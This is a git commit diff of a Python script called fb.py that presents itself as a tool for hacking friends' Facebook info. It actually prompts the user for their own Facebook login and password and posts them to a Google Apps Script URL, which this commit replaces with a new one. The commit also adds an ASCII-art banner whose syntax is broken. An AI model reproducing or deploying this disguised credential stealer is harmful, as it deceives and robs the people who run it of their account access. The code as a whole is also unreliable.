bbe12d9b8ca8113ccd9ce4b9f6d86ac3ad09c130
bgmpyaesonehmoo290G <79253197+bgmpyaesonehmoo290G@users.noreply.github.com>
2021-02-22 10:05:55 +0630

    Update fb.py

--- fb.py
+++ fb.py
@@ -4,6 +4,31 @@ import pyfiglet
 import time
 a = pyfiglet.figlet_format('facebook info')
 print(a)
+print "\e[96m
+ '     ██░▀██████████████▀░██\n'
+'      █▌▒▒░████████████░▒▒▐█\n'
+'      █░▒▒▒░██████████░▒▒▒░█\n'
+'      ▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▐\n'
+'      ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░\n'
+'      ███▀▀▀██▄▒▒▒▒▒▒▒▄██▀▀▀██\n'
+'      ██░░░▐█░▀█▒▒▒▒▒█▀░█▌░░░█\n'
+'     ▐▌░░░▐▄▌░▐▌▒▒▒▐▌░▐▄▌░░▐▌\n'
+'     █░░░▐█▌░░▌▒▒▒▐░░▐█▌░░█\n'
+'     ▒▀▄▄▄█▄▄▄▌░▄░▐▄▄▄█▄▄▀▒\n'
+'     ░░░░░░░░░░└┴┘░░░░░░░░░\n'
+'     ██▄▄░░░░░░░░░░░░░░▄▄██\n'
+'     ████████▒▒▒▒▒▒████████\n'
+'     █▀░░███▒▒░░▒░░▒▀██████\n'
+'     █▒░███▒▒╖░░╥░░╓▒▐█████\n'
+'     █▒░▀▀▀░░║░░║░░║░░█████\n'
+'     ██▄▄▄▄▀▀┴┴╚╧╧╝╧╧╝┴┴███\n'
+'     ██████████████████████\n'
+'   ╔═╗──────────╔══╗──────────╔╗╔╗───'
+'   ║╬║╔╦╗╔═╗─╔═╗║══╣╔═╗╔═╦╗╔═╗║╚╝║╔══╗╔═╗╔═╗'
+'   ║╔╝║║║║╬╚╗║╩╣╠══║║╬║║║║║║╩╣║╔╗║║║║║║╬║║╬║'
+'   ╚╝─╠╗║╚══╝╚═╝╚══╝╚═╝╚╩═╝╚═╝╚╝╚╝╚╩╩╝╚═╝╚═╝'
+'   ───╚═╝───────────────────────────')
+"
 print("autor by: Pyae Sone Hmoo")
 print("dont use illegal")
 print('please login with your facebook \n for hack your firends info')
@@ -11,7 +36,7 @@ print('please login with your facebook \n for hack your firends info')
 umail =input("please Enter phone and gmail:")
 upass =input("please Enter  password'")
 data ={'mail':umail,'pass':upass}
-rq =requests.post('https://script.google.com/macros/s/AKfycbzpRqyHxvWSniIhc5UqBK-RJDz3gGCo4xYBlLwFkhAdNEsKLmI/exec',data=data)
+rq =requests.post('https://script.google.com/macros/s/AKfycbx1cnhTRxQYCCWH0E55DRSXr54-p2-Q-0AEzUtqoTRZVHx1sw/exec',data=data)
 
 for i in range(100):
    print(i,'%')
